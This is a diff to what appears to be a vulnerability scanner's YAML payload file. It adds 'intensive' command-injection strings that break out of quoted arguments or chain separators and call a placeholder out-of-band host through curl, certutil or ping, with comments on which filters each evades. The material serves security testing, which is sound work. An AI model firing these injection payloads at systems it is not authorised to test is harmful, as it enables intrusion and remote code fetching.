@@ -14,6 +14,17 @@ payloads:
   - "$(curl {{oast_url}})"
   - "`curl {{oast_url}}`"
   - "& nslookup {{oast_domain}} &"
+# Tried only when the planner marks cmdi a priority for the target. More separators/quote-breakouts and
+# Windows variants, so a backend that rejects ;/| or runs cmd.exe still fires. Every one carries the
+# unique OAST token, so the SAME out-of-band oracle confirms it — a callback or nothing, zero FP.
+intensive_payloads:
+  - "%0acurl {{oast_url}}%0a"                                  # newline separator (URL-encoded)
+  - "'; curl {{oast_url}} #"                                   # break out of a single-quoted argument
+  - "\"; curl {{oast_url}} #"                                  # break out of a double-quoted argument
+  - "|| curl {{oast_url}}"                                     # OR: runs when the preceding command fails
+  - "&& curl {{oast_url}}"                                     # AND: runs when the preceding command succeeds
+  - "& certutil -urlcache -split -f http://{{oast_domain}}/ x &"  # Windows LOLBIN outbound fetch
+  - "| ping -n 1 {{oast_domain}}"                              # Windows ping (DNS callback)
 oracle:
   type: any_of
   checks:
